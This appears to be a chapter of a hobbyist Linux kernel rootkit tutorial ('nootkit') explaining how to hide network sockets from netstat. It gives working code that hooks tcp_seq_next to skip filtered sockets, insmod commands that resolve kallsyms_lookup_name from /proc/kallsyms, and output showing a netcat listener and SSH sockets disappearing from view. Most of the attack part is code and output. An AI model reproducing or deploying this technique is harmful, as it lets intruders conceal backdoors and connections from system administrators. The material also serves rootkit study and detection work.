# Nootkit Section 3

## `netstat` In The Kernel

From a quick `strace`, it seems that `netstat` first iterates over all `/proc/*/fd/*` entries,
`readlink`s each one (which probably yields some socket identifier as seen with the `readlink` shell
utility on such a link of a socket file descriptor),

And finally reads `/proc/net/{tcp, udp, ...}` to get details for each socket.

I read somewhere ([here](https://utcc.utoronto.ca/~cks/space/blog/linux/ReplacingNetstatNotBad)) that
the `ss` command, which is nowadays prevalent, uses *netlink sockets* to read socket metadata -
and that is a whole 'nother mechanism.

With all these APIs we have to make a choice (or just do 'em all I ain't scared).
I think it would make sense to stick to hiding from the `netstat` implementation alone for this section.

### What To Hook?

The age old question, asked in many forms throughout time by hackers and fishermen alike.

Do we hide from the procfs dirlist? Or maybe from the `/proc/net/*` outputs???

Luckily we already have a dirlist hider in our hands, and we can see if that capability is enough:

```sh
# start listening socket
nc -l 0.0.0.0 1337 &

netstat -anop | grep 1337
>>> tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      2119/nc              off (0.00/0/0)

# check /proc/pid/fd to see which inode/filename we need to hide from the dirlist
ls -li /proc/2119/fd
>>> total 0
>>> 29008 lrwx------ 1 root root 64 Jul  4 20:55 0 -> /dev/pts/0
>>> 29009 lrwx------ 1 root root 64 Jul  4 20:55 1 -> /dev/pts/0
>>> 29010 lrwx------ 1 root root 64 Jul  4 20:55 2 -> /dev/pts/0
>>> 29011 lrwx------ 1 root root 64 Jul  4 20:55 3 -> 'socket:[25736]'

# hide inode 29011 and rerun netstat to see if the socket is still visible
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_inodes=29011

# fd 3 is hidden
ls -li /proc/2119/fd
>>> total 0
>>> 29008 lrwx------ 1 root root 64 Jul  4 20:55 0 -> /dev/pts/0
>>> 29009 lrwx------ 1 root root 64 Jul  4 20:55 1 -> /dev/pts/0
>>> 29010 lrwx------ 1 root root 64 Jul  4 20:55 2 -> /dev/pts/0

netstat -anop | grep 1337
>>> tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
```

Ah, if we only hide from the dirlist, `netstat` will still register the socket as being open, probably due to it
still being present in `/proc/net/tcp` - the only information lost is the socket's owning process, which
makes sense.

So either way, we'll have to hide from the various `/proc/net`s - additionaly hiding sockets from dirlists
may or may not be required.

### `/proc/net/*` Implementation

My intent was to find some function where, as in the previous section, we could sit "inline" and filter
existing sockets from appearing in the output of `/proc/net/*`. Of course, each file in `/proc/net` has
a different implementation of read operations.

Browsing around `/fs/proc/proc_net.c` in the kernel source, I found the exported symbol `proc_create_net_data`,
and some of it's brothers and sisters with slightly different names - these are used by the kernel or by external
modules to define new psuedo-files under `/proc/net`!

The one for `/proc/net/tcp` is defined in `/net/ipv4/tcp_ipv4.c`:

```C
static int __net_init tcp4_proc_init_net(struct net *net)
{
    if (!proc_create_net_data("tcp", 0444, net->proc_net, &tcp4_seq_ops,
            sizeof(struct tcp_iter_state), &tcp4_seq_afinfo))
        return -ENOMEM;
    return 0;
}
```

The operations, which according to [this](https://docs.kernel.org/filesystems/seq_file.html) nice document explaining
the `seq_file` interface, are used to initialize and use an iterator. Good!

The function which returns the next element in the iterator is `tcp_seq_next`, and it's even exported:

```C
void *tcp_seq_next(struct seq_file *seq, void *v, loff_t *pos)
{
    struct tcp_iter_state *st = seq->private;
    void *rc = NULL;

    if (v == SEQ_START_TOKEN) {
        rc = tcp_get_idx(seq, 0);
        goto out;
    }

    switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
        rc = listening_get_next(seq, v);
        if (!rc) {
            st->state = TCP_SEQ_STATE_ESTABLISHED;
            st->bucket = 0;
            st->offset = 0;
            rc = established_get_first(seq);
        }
        break;
    case TCP_SEQ_STATE_ESTABLISHED:
        rc = established_get_next(seq, v);
        break;
    }
out:
    ++*pos;
    st->last_pos = *pos;
    return rc;
}
EXPORT_SYMBOL(tcp_seq_next);
```

It's understandable that `rc` in some way represents the TCP socket information as it's what the function yields,
but what is it really?

Well, we can just take a look at the called functions `listening_get_next` and `established_get_next` and see how they
construct this value. Lo and behold, it's a `struct sock`! This struct contains everything we need to base our hide filter on.

So now remains just constructing the hook logic to implement within the function.

## Hooking `tcp_seq_next` (And `seq_file.op.next` Methods In General)

It's important to mention that `tcp_seq_next` is a good target because it has no use outside of `fops` for
`/proc/net/tcp` and `/proc/net/tcp6`.

No need to get sleezy, we can do something cheezy like this:

```C
void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
{   
    /* original tcp_seq_next_hook code */

    struct tcp_iter_state *st = seq->private;
    void *rc = NULL;

    if (v == SEQ_START_TOKEN) {
        rc = ksyms__tcp_get_idx(seq, 0);
        goto out;
    }

    switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
        rc = ksyms__listening_get_next(seq, v);
        if (!rc) {
            st->state = TCP_SEQ_STATE_ESTABLISHED;
            st->bucket = 0;
            st->offset = 0;
            rc = ksyms__established_get_first(seq);
        }
        break;
    case TCP_SEQ_STATE_ESTABLISHED:
        rc = ksyms__established_get_next(seq, v);
        break;
    }
out:
    ++*pos;
    st->last_pos = *pos;

    /* hook code */

    if (rc) {
        printk(KERN_INFO "==== SOCKET ====");
        printk(KERN_INFO "sk_prot: %s", ((struct sock *)rc)->sk_prot->name);
        printk(KERN_INFO "sk_daddr: %x", ((struct sock *)rc)->sk_daddr);
        printk(KERN_INFO "sk_rcv_saddr: %x", ((struct sock *)rc)->sk_rcv_saddr);
        printk(KERN_INFO "sk_dport: %d", ((struct sock *)rc)->sk_dport);
        printk(KERN_INFO "sk_num: %d", ((struct sock *)rc)->sk_num);

        if (((struct sock *)rc)->sk_num == 22) {
            printk(KERN_INFO "hiding socket!");
            return seq->op->next(seq, rc, pos);
        }
    }

    /* original tcp_seq_next_hook code */

    return rc;
}
```

At the end of the function, before yielding the `struct sock`, we can implement our filters;
and to actually hide a socket, we need only to call the `next` method (which is actually just our hook function
again) with a twist; `rc` is not just a `struct sock`! It is also used as some sort of position descriptor or whatnot.

We can see this in action in `fs/seq_file.c`, in `traverse` - which actually uses the `next` method to iterate:

```C
static int traverse(struct seq_file *m, loff_t offset) {
    // ...
    p = m->op->next(m, p, &m->index);
    // ...
}
```

The **return value** is used as the `v` argument.
So we replicate just that as done above, and we can successfully hide TCP sockets (IPv4 & IPv6!) :D

We'll repeat the same process for UDP sockets, see the full implementation in [src/hide/proc_net.c](../src/hide/proc_net.c).

## End Product

After adding a configuration mechanism and filtering code within the hook, we have a nice interface:

```sh
netstat -tna
>>> Active Internet connections (servers and established)
>>> Proto Recv-Q Send-Q Local Address           Foreign Address         State      
>>> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
>>> tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN     
>>> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
>>> tcp        0      0 192.168.122.122:22      192.168.122.1:41546     ESTABLISHED
>>> tcp6       0      0 :::22                   :::*                    LISTEN 

insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
"hide_sockets=\"\
    PROTO = 1; LOCAL = 192.2.3.0/255.0.0.0:10-23; FOREIGN = 1.0.0.0/0.0.0.0:0-65535;, \
    PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; \
\""

netstat -tna
>>> Active Internet connections (servers and established)
>>> Proto Recv-Q Send-Q Local Address           Foreign Address         State      
>>> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
>>> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
>>> tcp6       0      0 :::22                   :::*                    LISTEN
```

And we have some nice debug logs:

```sh
[ 4166.133016] nootkit: Hiding TCP socket because of filter [   PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; ]!
[ 4166.133068] nootkit: Hiding TCP socket because of filter [   PROTO = 1; LOCAL = 192.2.3.0/255.0.0.0:10-23; FOREIGN = 1.0.0.0/0.0.0.0:0-65535;]!
```

For the configuration mechanism check out [src/config.c](../src/config.c) and [src/config.h](../src/config.h);
for the filter code see [src/hide/proc_net.c](../src/hide/proc_net.c).
